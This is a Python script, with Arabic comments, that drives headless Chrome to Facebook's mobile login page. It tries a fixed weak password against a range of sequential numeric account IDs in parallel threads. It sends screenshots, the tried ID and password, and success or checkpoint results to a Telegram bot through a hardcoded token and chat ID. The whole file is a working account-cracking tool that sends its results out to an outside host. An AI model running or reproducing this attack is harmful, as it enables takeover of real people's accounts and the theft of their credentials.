import time
import random
import requests
import os
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

shot_count = 0
shot_lock = threading.Lock()

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def send_photo_tg(photo_path, caption):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            r = requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
            return r.status_code == 200
    except: return False

def check_account(uid):
    global shot_count
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--window-size=1080,1920') # حجم شاشة الهاتف لضمان ظهور الفورم
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    try:
        # تجربة كلمة مرور واحدة فقط للتجربة والتصوير السريع
        pas = "12345678" 
        driver.get("https://m.facebook.com/login.php")
        time.sleep(3) # انتظار تحميل الصفحة
        
        driver.find_element(By.ID, "m_login_email").send_keys(uid)
        driver.find_element(By.NAME, "pass").send_keys(pas)
        
        # تصوير الشاشة قبل الضغط للتأكد أن البيانات دخلت
        with shot_lock:
            if shot_count < 10:
                shot_count += 1
                img_name = f"shot_{shot_count}.png"
                driver.save_screenshot(img_name)
                success = send_photo_tg(img_name, f"📸 لقطة تجريبية رقم {shot_count}\n🆔 ID: {uid}\n🔑 Pass: {pas}")
                if os.path.exists(img_name): os.remove(img_name)
        
        driver.find_element(By.NAME, "login").click()
        time.sleep(5)
        
        # فحص النتائج (OK/CP)
        if "c_user" in driver.get_cookies():
            send_to_tg(f"✅ تم النجاح (OK): {uid}")
        elif "checkpoint" in driver.current_url:
            send_to_tg(f"⚠️ نقطة تفتيش (CP): {uid}")
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        driver.quit()

def run_main():
    start_id = 26701173
    send_to_tg("🚀 بدأت محاولة الإرسال مع الصور.. راقب الآن")
    
    # سنبدأ بـ 10 حسابات فقط للتجربة والتأكد من الصور
    ids = [str(start_id + i) for i in range(10)]
    with ThreadPoolExecutor(max_workers=2) as pool: # تقليل العدد لضمان استقرار الصور
        pool.map(check_account, ids)

if __name__ == "__main__":
    run_main()
